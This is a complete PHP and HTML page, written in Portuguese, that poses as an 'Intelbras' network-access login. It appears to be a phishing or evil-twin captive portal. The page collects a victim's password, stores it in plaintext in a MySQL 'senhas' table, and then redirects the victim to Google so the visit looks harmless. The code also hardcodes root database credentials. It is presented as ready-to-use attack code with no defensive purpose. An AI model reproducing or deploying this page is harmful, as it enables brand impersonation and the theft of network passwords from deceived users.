```php
<?php
$mensagem = '';
$tipoMensagem = '';

try {
    $pdo = new PDO(
        'mysql:host=127.0.0.1;port=3306;dbname=portal;charset=utf8mb4',
        'root',
        '123',
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
        ]
    );

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $senha = $_POST['senha'] ?? '';

        if (trim($senha) !== '') {
            $sql = 'INSERT INTO senhas (senha) VALUES (:senha)';
            $stmt = $pdo->prepare($sql);
            $stmt->execute(['senha' => $senha]);

            $mensagem = 'Operação realizada com sucesso!';
            $tipoMensagem = 'sucesso';

	    sleep(3);
	} else {
            $mensagem = 'Informe uma senha.';
            $tipoMensagem = 'erro';
        }
    }
} catch (PDOException $e) {
    $mensagem = 'Não foi possível conectar ao banco de dados.';
    $tipoMensagem = 'erro';
}
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Intelbras | Acesso</title>
   <?php if ($tipoMensagem === 'sucesso'): ?>
        <meta http-equiv="refresh" content="3;url=https://www.google.com.br">
    <?php endif; ?>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            min-height: 100vh;
            font-family: Arial, Helvetica, sans-serif;
            background:
                radial-gradient(
                    circle at top right,
                    rgba(37, 99, 235, 0.25),
                    transparent 40%
                ),
                linear-gradient(135deg, #0f172a, #172554, #111827);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            color: #1e293b;
        }

        .login-container {
            width: 100%;
            max-width: 410px;
        }

        .brand {
            text-align: center;
            color: #fff;
            margin-bottom: 28px;
        }

        .brand h1 {
            font-size: 32px;
            font-weight: 800;
            letter-spacing: 3px;
        }

        .brand p {
            margin-top: 10px;
            color: #cbd5e1;
            font-size: 14px;
        }

        .login-card {
            background: #fff;
            padding: 36px;
            border-radius: 20px;
            box-shadow: 0 24px 70px rgba(0, 0, 0, 0.3);
        }

        .login-card h2 {
            font-size: 24px;
            margin-bottom: 10px;
            text-align: center;
        }

        .description {
            color: #64748b;
            font-size: 14px;
            line-height: 1.6;
            text-align: center;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 22px;
        }

        .form-group label {
            display: block;
            margin-bottom: 9px;
            font-size: 14px;
            font-weight: 600;
        }

        .password-wrapper {
            position: relative;
        }

        .password-wrapper input {
            width: 100%;
            height: 50px;
            padding: 0 48px 0 15px;
            border: 1px solid #cbd5e1;
            border-radius: 10px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .password-wrapper input:focus {
            border-color: #2563eb;
            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.12);
        }

        .toggle-password {
            position: absolute;
            top: 50%;
            right: 12px;
            transform: translateY(-50%);
            border: none;
            background: transparent;
            color: #64748b;
            cursor: pointer;
            font-size: 13px;
        }

        .submit-button {
            width: 100%;
            height: 50px;
            border: none;
            border-radius: 10px;
            background: linear-gradient(135deg, #2563eb, #1d4ed8);
            color: #fff;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .submit-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(37, 99, 235, 0.25);
        }

        .message {
            margin-top: 18px;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            text-align: center;
            overflow-wrap: anywhere;
        }

        .sucesso {
            color: #166534;
            background: #dcfce7;
        }

        .erro {
            color: #991b1b;
            background: #fee2e2;
        }

        .footer {
            text-align: center;
            color: #94a3b8;
            font-size: 12px;
            margin-top: 24px;
        }

        @media (max-width: 480px) {
            .login-card {
                padding: 28px 22px;
            }

            .brand h1 {
                font-size: 28px;
            }
        }
    </style>
</head>

<body>
    <main class="login-container">

        <header class="brand">
            <h1>INTELBRAS</h1>
            <p>Central de acesso à rede</p>
        </header>

        <section class="login-card">
            <h2>Bem-vindo</h2>

            <p class="description">
                Informe sua senha para continuar.
            </p>

            <form method="post" action="">
                <div class="form-group">
                    <label for="senha">Senha de acesso</label>

                    <div class="password-wrapper">
                        <input
                            type="password"
                            id="senha"
                            name="senha"
                            placeholder="Digite sua senha"
                            autocomplete="current-password"
                            required
                        >

                        <button
                            class="toggle-password"
                            type="button"
                            id="toggleSenha"
                            aria-label="Mostrar senha"
                            aria-pressed="false"
                        >
                            Mostrar
                        </button>
                    </div>
                </div>

                <button class="submit-button" type="submit">
                    Entrar
                </button>
            </form>

            <?php if ($mensagem !== ''): ?>
                <p class="message <?= htmlspecialchars($tipoMensagem, ENT_QUOTES, 'UTF-8') ?>"
                   role="status">
                    <?= htmlspecialchars($mensagem, ENT_QUOTES, 'UTF-8') ?>
                </p>
            <?php endif; ?>
        </section>

        <footer class="footer">
            Interface de acesso à rede
        </footer>

    </main>

    <script>
        const senha = document.getElementById('senha');
        const toggle = document.getElementById('toggleSenha');

        toggle.addEventListener('click', () => {
            const mostrar = senha.type === 'password';

            senha.type = mostrar ? 'text' : 'password';
            toggle.textContent = mostrar ? 'Ocultar' : 'Mostrar';
            toggle.setAttribute('aria-pressed', String(mostrar));
            toggle.setAttribute(
                'aria-label',
                mostrar ? 'Ocultar senha' : 'Mostrar senha'
            );
        });
    </script>
</body>
</html>
```
